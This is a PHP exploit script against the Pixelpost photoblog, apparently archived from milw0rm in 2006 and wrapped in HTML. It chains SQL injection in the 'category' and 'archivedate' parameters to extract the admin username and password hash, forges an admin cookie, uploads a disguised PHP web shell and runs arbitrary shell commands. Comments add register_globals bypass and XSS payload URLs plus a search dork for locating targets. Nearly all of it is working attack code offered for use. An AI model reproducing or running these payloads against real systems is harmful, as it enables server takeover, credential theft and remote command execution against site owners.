<html><head><title>Pixelpost <= 1-5rc1-2 Remote Privilege Escalation Exploit</title></head><pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;Pixelpost &lt;= 1-5rc1-2 privilege escalation exploit\r\n&quot;;
echo &quot;by rgod rgod@autistici.org\r\n&quot;;
echo &quot;site: http://retrogod.altervista.org\r\n&quot;;
echo &quot;dork: pixelpost \&quot;RSS 2.0\&quot; \&quot;ATOM feed\&quot; \&quot;Valid xHTML / Valid CSS\&quot;\r\n\r\n&quot;;

/*
works with:
magic_quotes_gpc=Off
*/

if ($argc&lt;5) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path your_ip cmd OPTIONS\r\n&quot;;
echo &quot;host:      target server (ip/hostname)\r\n&quot;;
echo &quot;path:      path to pixelpost\r\n&quot;;
echo &quot;your ip:   your actual ip adress, we need it to build an admin cookie\r\n&quot;;
echo &quot;           this is automatically set to your proxy ip if you use one\r\n&quot;;
echo &quot;cmd:       a shell command\r\n&quot;;
echo &quot;Options:\r\n&quot;;
echo &quot;   -T[prefix]   specify a table prefix different from \&quot;pixelpost_\&quot;\r\n&quot;;
echo &quot;   -p[port]:    specify a port other than 80\r\n&quot;;
echo &quot;   -P[ip:port]: specify a proxy\r\n&quot;;
echo &quot;Examples:\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; a.b.c.d /pixelpost/ w.x.y.z cat ./../includes/pixelpost.php\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; a.b.c.d / w.x.y.z  ls -la -p81\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; a.b.c.d / none ls -la -P1.1.1.1:80\r\n&quot;;
die;
}
/* software site: http://www.pixelpost.org/

   description: &quot;A small photoblog application that's a no-brainer to set up and
   use - this is truly for anyone wishing regularly to post their photos on  the
   web like a blog.&quot;

   -----

   i) sql injection in index.php near lines 670-680:

   ...
   if($_GET['category'] != &quot;&quot;)
	{
		// Modified from Mark Lewin's hack for multiple categories
		$query = mysql_query(&quot;SELECT 1,t2.id,headline,image,datetime
		        	      FROM  {$pixelpost_db_prefix}catassoc as t1
				      INNER JOIN {$pixelpost_db_prefix}pixelpost t2 on t2.id = t1.image_id
				      WHERE t1.cat_id = '&quot;.$_GET['category'].&quot;'
				      AND (datetime&lt;='$cdate')
				      ORDER BY datetime DESC&quot;);
		$lookingfor = 1;
	}
   ...

   nice code, isn't it?

   with magic_quotes_gpc = Off:
   http://[target]/[path]/index.php?x=browse&amp;category='UNION SELECT '1','2',admin,'4','5' FROM pixelpost_config WHERE id=1/*
   http://[target]/[path]/index.php?x=browse&amp;category='UNION SELECT '1','2',password,'4','5' FROM pixelpost_config WHERE id=1/*

   now, at screen, you have admin username &amp; MD5 password hash and you can build
   an admin cookie:

   Cookie: pp_user=[username]; pp_password=[sha1([md5hash].[your_ip_address])];

   Admin can upload .php files in images/ folder, files are renamed but you can
   see new filename in main index page, so... you launch commands:

   http://[target]/[path]/images/20060603005716_suntzu.php?cmd=cat%20./../includes/pixelpost.php

   ii) same kind of sql injection in 'archivedate' argument at lines 681-687:
   ...
   ELSE IF ($_GET['archivedate'] != &quot;&quot;)
	{

		$where = &quot;AND (DATE_FORMAT(datetime, '%Y-%m')='&quot;.$_GET['archivedate'].&quot;')&quot;; //DATE_FORMAT(foo, '%Y-%m-%d')
		$query = mysql_query(&quot;SELECT 1,id,headline,image, datetime FROM &quot;.$pixelpost_db_prefix.&quot;pixelpost WHERE (datetime&lt;='$cdate') $where ORDER BY datetime desc&quot;);
		$lookingfor = 1;
	}
   ...
   poc:

   http://[target]/[path]/index.php?x=browse&amp;archivedate=')%20UNION%20SELECT%20'1','2',password,'4','5'%20FROM%20pixelpost_config/*

   iii)
   in admin/ folder at the begin of every script, except for index.php, we have:

   &lt;?php
   if(!isset($_SESSION[&quot;pixelpost_admin&quot;]) || $cfgrow['password'] != $_SESSION[&quot;pixelpost_admin&quot;]) {
	die (&quot;Try another day!!&quot;);
   }
   ...

   if register_globals= On, you can easily bybass this protection, poc:

   http://[target]/]path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&amp;cfgrow[password]=1

   this can be used to see some interesting configuration info about target server:

   http://[target]/[path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&amp;cfgrow[password]=1&amp;view=info

   or to launch XSS attacks:

   http://[target]/[path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&amp;cfgrow[password]=1&amp;view=info&amp;admin_lang_pp_exif1=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
   http://[target]/[path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&amp;cfgrow[password]=1&amp;view=info&amp;admin_lang_pp_exif2=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
   http://[target]/[path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&amp;cfgrow[password]=1&amp;view=info&amp;admin_lang_pp_path=&lt;script&gt;alert(document.cookie)&lt;/script&gt;

   iv) another xss, without to be logged in:
   http://[target]/[path]/admin/index.php?loginmessage=&quot;&gt;&lt;script&gt;window.open(&quot;http://retrogod.altervista.org&quot;)&lt;/script&gt;

   									      */
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;

}

function is_hash($hash)
{
 if (ereg(&quot;^[a-f0-9]{32}&quot;,trim($hash))) {return true;}
 else {return false;}
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$your_ip=$argv[3];
$cmd=&quot;&quot;;$port=80;$proxy=&quot;&quot;;$table_prefix=&quot;pixelpost_&quot;;

for ($i=4; $i&lt;=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;) and ($temp&lt;&gt;&quot;-T&quot;))
{$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-T&quot;)
{
  $table_prefix=str_replace(&quot;-T&quot;,&quot;&quot;,$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else
{
$p='http://'.$host.':'.$port.$path;
$temp=explode(&quot;:&quot;,$proxy);
$your_ip=$temp[0];
}

echo &quot;Trying sql injection in 'category' argument...\r\n&quot;;
$sql=&quot;'/**/UNION SELECT/**/'1','2',password,'4','5'/**/FROM/**/&quot;.$table_prefix.&quot;config/**/WHERE/**/id=1/*&quot;;
$sql=urlencode($sql);
$packet=&quot;GET &quot;.$p.&quot;?x=browse&amp;category=&quot;.$sql.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
$temp=explode(&quot;alt=\&quot;&quot;,$html);
$temp2=explode(&quot;\&quot;&quot;,$temp[1]);
$hash=trim($temp2[0]);
if (is_hash($hash)){
echo &quot;admin md5 password hash -&gt; &quot;.$hash.&quot;\r\n&quot;;
$sql=&quot;'/**/UNION/**/SELECT/**/'1','2',admin,'4','5'/**/FROM/**/&quot;.$table_prefix.&quot;config/**/WHERE/**/id=1/*&quot;;
$sql=urlencode($sql);
$packet=&quot;GET &quot;.$p.&quot;?x=browse&amp;category=&quot;.$sql.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
$temp=explode(&quot;alt=\&quot;&quot;,$html);
$temp2=explode(&quot;\&quot;&quot;,$temp[1]);
$admin=trim($temp2[0]);
echo &quot;  \&quot;   username          -&gt; &quot;.$admin.&quot;\r\n&quot;;
}
else { echo &quot;Trying with 'archivedate' argument...\r\n&quot;;
$sql=&quot;')/**/UNION SELECT/**/'1','2',password,'4','5'/**/FROM/**/&quot;.$table_prefix.&quot;config/**/WHERE/**/id=1/*&quot;;
$sql=urlencode($sql);
$packet=&quot;GET &quot;.$p.&quot;?x=browse&amp;archivedate=&quot;.$sql.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
$temp=explode(&quot;alt=\&quot;&quot;,$html);
$temp2=explode(&quot;\&quot;&quot;,$temp[1]);
$hash=trim($temp2[0]);
if (is_hash($hash)){
         echo &quot;admin md5 password hash -&gt; &quot;.$hash.&quot;\r\n&quot;;
         }
else {die (&quot;Exploit failed...magic_quotes_gpc on here or code patched&quot;);}

$sql=&quot;')/**/UNION/**/SELECT/**/'1','2',admin,'4','5'/**/FROM/**/&quot;.$table_prefix.&quot;config/**/WHERE/**/id=1/*&quot;;
$sql=urlencode($sql);
$packet=&quot;GET &quot;.$p.&quot;?x=browse&amp;archivedate=&quot;.$sql.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
$temp=explode(&quot;alt=\&quot;&quot;,$html);
$temp2=explode(&quot;\&quot;&quot;,$temp[1]);
$admin=trim($temp2[0]);
echo &quot;  \&quot;   username          -&gt; &quot;.$admin.&quot;\r\n&quot;;
}

$cookie=&quot;pp_user=&quot;.$admin.&quot;; pp_password=&quot;.sha1($hash.$your_ip).&quot;;&quot;;
$packet=&quot;GET &quot;.$p.&quot;admin/index.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
$temp=explode(&quot;Set-Cookie: &quot;,$html);
$cookie=&quot;&quot;;
for ($i=1; $i&lt;=count($temp); $i++)
{
$temp2=explode(&quot; &quot;,$temp[$i]);
$cookie.=&quot; &quot;.$temp2[0];
}
echo &quot;admin cookie            -&gt;&quot;.$cookie.&quot;\r\n&quot;;

$shell=
'&lt;?php
if (get_magic_quotes_gpc()){$_REQUEST[&quot;cmd&quot;]=stripslashes($_REQUEST[&quot;cmd&quot;]);}
ini_set(&quot;max_execution_time&quot;,0);
error_reporting(0);
echo chr(0x2A).chr(0x64).chr(0x65).chr(0x6C).chr(0x69).chr(0x2A);
passthru($_REQUEST[&quot;cmd&quot;]);
echo chr(0x2A).chr(0x64).chr(0x65).chr(0x6C).chr(0x69).chr(0x2A);
?&gt;';
srand(make_seed());
$anumber = rand(1,99999);
$my_file=&quot;suntzu&quot;.$anumber.&quot;.php&quot;;
$data='
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name=&quot;headline&quot;

Under Costruction... - Admin.
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name=&quot;category[]&quot;

1
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name=&quot;body&quot;


-----------------------------7d6318101b00a2
Content-Disposition: form-data; name=&quot;autodate&quot;

3
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name=&quot;post_year&quot;


-----------------------------7d6318101b00a2
Content-Disposition: form-data; name=&quot;post_month&quot;


-----------------------------7d6318101b00a2
Content-Disposition: form-data; name=&quot;post_day&quot;


-----------------------------7d6318101b00a2
Content-Disposition: form-data; name=&quot;post_hour&quot;


-----------------------------7d6318101b00a2
Content-Disposition: form-data; name=&quot;post_minute&quot;


-----------------------------7d6318101b00a2
Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;'.$my_file.'&quot;
Content-Type: image/jpeg

'.$shell.'
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name=&quot;submit&quot;

Upload
-----------------------------7d6318101b00a2--
';

$packet=&quot;POST &quot;.$p.&quot;admin/index.php?x=save HTTP/1.0\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d6318101b00a2\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);

$packet=&quot;GET &quot;.$p.&quot;index.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
$temp=explode(&quot;img src=\&quot;&quot;,$html);
$temp2=explode(&quot; &quot;,$temp[1]);
for ($i=1; $i&lt;=count($temp); $i++)
{
$temp2=explode(&quot;\&quot;&quot;,$temp[$i]);
if (eregi($my_file,$temp2[0]))
 {
  $my_path=$temp2[0];
  echo &quot;shell -&gt; &quot;.$my_path.&quot;\r\n&quot;;
  break;
 }
}

$packet=&quot;GET &quot;.$p.$my_path.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Cookie: cmd=&quot;.$cmd.&quot;;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
if (strstr($html,&quot;*deli*&quot;))
{
 $temp=explode(&quot;*deli*&quot;,$html);
 die(&quot;Exploit succeeded...\r\n&quot;.$temp[1]);
}
else
{
 echo &quot;Failed to launch commands...&quot;;
}
?&gt;

# milw0rm.com [2006-06-03]</pre></html>